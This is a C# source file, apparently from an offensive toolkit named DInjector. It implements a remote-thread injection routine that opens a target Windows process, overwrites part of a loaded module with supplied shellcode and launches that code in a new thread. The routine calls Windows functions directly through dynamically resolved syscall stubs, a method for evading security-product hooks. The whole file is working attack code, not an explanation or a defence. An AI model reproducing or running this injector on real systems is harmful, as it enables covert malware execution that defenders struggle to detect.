using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadDll
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            DI.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        private static bool closeHandle(IntPtr hObject)
        {
            object[] parameters = { hObject };
            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
        }

        public static void Execute(byte[] shellcodeBytes, int processID, string moduleName)
        {
            var shellcode = shellcodeBytes;

            #region NtOpenProcess

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess sysNtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr hProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

            CLIENT_ID ci = new CLIENT_ID { UniqueProcess = (IntPtr)processID };

            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtOpenProcess(
                ref hProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadDll) [+] NtOpenProcess");
            else
                Console.WriteLine($"(RemoteThreadDll) [-] NtOpenProcess: {ntstatus}");

            #endregion

            Process objProcess = Process.GetProcessById(processID);
            foreach (ProcessModule module in objProcess.Modules)
            {
                if (module.FileName.ToLower().Contains(moduleName))
                {
                    IntPtr baseAddress = module.BaseAddress + 4096;
                    IntPtr regionSize = (IntPtr)shellcode.Length;
                    uint oldProtect = 0;

                    #region NtProtectVirtualMemory (PAGE_READWRITE)

                    stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
                    NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

                    ntstatus = sysNtProtectVirtualMemory(
                        hProcess,
                        ref baseAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_READWRITE,
                        out oldProtect);

                    if (ntstatus == 0)
                        Console.WriteLine("(RemoteThreadDll) [+] NtProtectVirtualMemory, PAGE_READWRITE");
                    else
                        Console.WriteLine($"(RemoteThreadDll) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                    #endregion

                    #region NtWriteVirtualMemory

                    stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
                    NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

                    var buffer = Marshal.AllocHGlobal(shellcode.Length);
                    Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

                    uint bytesWritten = 0;

                    ntstatus = sysNtWriteVirtualMemory(
                        hProcess,
                        baseAddress,
                        buffer,
                        (uint)shellcode.Length,
                        ref bytesWritten);

                    if (ntstatus == 0)
                        Console.WriteLine("(RemoteThreadDll) [+] NtWriteVirtualMemory");
                    else
                        Console.WriteLine($"(RemoteThreadDll) [-] NtWriteVirtualMemory: {ntstatus}");

                    Marshal.FreeHGlobal(buffer);

                    #endregion

                    #region NtProtectVirtualMemory (oldProtect)

                    ntstatus = sysNtProtectVirtualMemory(
                        hProcess,
                        ref baseAddress,
                        ref regionSize,
                        oldProtect,
                        out uint _);

                    if (ntstatus == 0)
                        Console.WriteLine("(RemoteThreadDll) [+] NtProtectVirtualMemory, oldProtect");
                    else
                        Console.WriteLine($"(RemoteThreadDll) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                    #endregion

                    #region NtCreateThreadEx

                    stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
                    NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));

                    IntPtr hThread = IntPtr.Zero;

                    ntstatus = sysNtCreateThreadEx(
                        out hThread,
                        DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        hProcess,
                        baseAddress,
                        IntPtr.Zero,
                        false,
                        0,
                        0,
                        0,
                        IntPtr.Zero);

                    if (ntstatus == 0)
                        Console.WriteLine("(RemoteThreadDll) [+] NtCreateThreadEx");
                    else
                        Console.WriteLine($"(RemoteThreadDll) [-] NtCreateThreadEx: {ntstatus}");

                    #endregion

                    closeHandle(hThread);

                    break;
                }
            }

            closeHandle(hProcess);
        }
    }
}
